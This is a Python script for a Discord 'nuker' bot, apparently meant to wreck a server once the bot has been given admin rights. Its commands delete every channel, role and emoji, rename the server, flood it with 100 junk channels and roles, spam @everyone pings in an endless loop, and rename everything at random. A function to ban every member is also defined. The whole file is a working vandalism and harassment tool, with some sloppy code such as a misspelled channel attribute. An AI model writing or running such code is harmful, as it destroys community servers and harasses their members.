import discord 
from discord.ext import commands
import asyncio
import random
import os
import string
import requests
from colorama import Fore,init 
init()
def randname(y):
    return ''.join(random.choice(string.ascii_uppercase) for i in range(y))
TOKEN = input("Your bot token: ")
os.system('cls') if os.name == 'nt' else os.system('clear')

bot = commands.Bot(command_prefix = "!",
                intents = discord.Intents.all())

async def toTrash(ctx):
    for c in ctx.guild.channels:
        await c.edit(position = random.randint(1,5))
@bot.event
async def on_ready():
    print('ready')
async def trassh(ctx):
    while True:
        bot.loop.create_task(toTrash(ctx))
        bot.loop.create_task(toTrash(ctx))
        bot.loop.create_task(toTrash(ctx))
        bot.loop.create_task(toTrash(ctx))
        bot.loop.create_task(toTrash(ctx))
        bot.loop.create_task(toTrash(ctx))
        bot.loop.create_task(spam(ctx))
        bot.loop.create_task(editRoles(ctx))
        bot.loop.create_task(editChan(ctx))

async def spam(ctx):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send("@everyone @here trash ur server")
        except:
            pass

async def editRoles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.edit(name = randname(10))
        except:
            pass
async def editChan(ctx):
    for role in ctx.guild.channel:
        try:
            await role.edit(name = randname(21))
        except:
            pass
async def delChannels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: Missing Permissions to delete channel: {Fore.LIGHTYELLOW_EX}{channel.name}")
async def delRoles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: Missing Permissions to delete role: {Fore.LIGHTYELLOW_EX}{role.name}")
async def guildEdit(ctx):
    await ctx.guild.edit(name = "Аркадий Кобяков")
async def banall(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            print(f"{Fore.LIGHTRED_EX}[ERROR]: Missing Permissions to ban member: {Fore.LIGHTYELLOW_EX}{member.name}")

async def delEmojis(ctx):
    for e in ctx.guild.emojis:
        try:
            await e.delete()
        except:
            pass
async def createChannels(ctx):
    for i in range(100):

        await ctx.guild.create_text_channel(name = randname(10))

async def createRoles(ctx):
    for i in range(100):
        await ctx.guild.create_role(name = randname(5))

@bot.command()
async def abf(ctx):
    bot.loop.create_task(delChannels(ctx))
    bot.loop.create_task(delRoles(ctx))
    bot.loop.create_task(delEmojis(ctx))
    bot.loop.create_task(guildEdit(ctx))
    bot.loop.create_task(createChannels(ctx))
    bot.loop.create_task(createRoles(ctx))

@bot.command()
async def trash(ctx):
    bot.loop.create_task(trassh(ctx))

bot.run(TOKEN)